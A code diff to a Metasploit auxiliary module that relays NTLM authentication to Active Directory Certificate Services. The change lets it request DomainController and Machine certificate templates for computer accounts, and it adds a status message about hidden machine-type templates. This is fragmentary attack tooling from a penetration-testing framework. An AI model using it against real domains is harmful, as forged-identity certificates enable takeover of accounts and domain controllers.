@@ -107,11 +107,12 @@ class MetasploitModule < Msf::Auxiliary
   def on_relay_success(relay_connection:, relay_identity:)
     case datastore['MODE']
     when 'AUTO'
-      cert_template = relay_identity.end_with?('$') ? 'Computer' : 'User'
-      retrieve_cert(relay_connection, relay_identity, cert_template)
+      cert_template = relay_identity.end_with?('$') ? ['DomainController', 'Machine'] : ['User']
+      retrieve_certs(relay_connection, relay_identity, cert_template)
     when 'ALL', 'QUERY_ONLY'
       cert_templates = get_cert_templates(relay_connection)
       unless cert_templates.nil? || cert_templates.empty?
+        print_status('***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***')
         print_good("Available Certificates for #{relay_identity} on #{datastore['RELAY_TARGET']}: #{cert_templates.join(', ')}")
         if datastore['MODE'] == 'ALL'
           retrieve_certs(relay_connection, relay_identity, cert_templates)
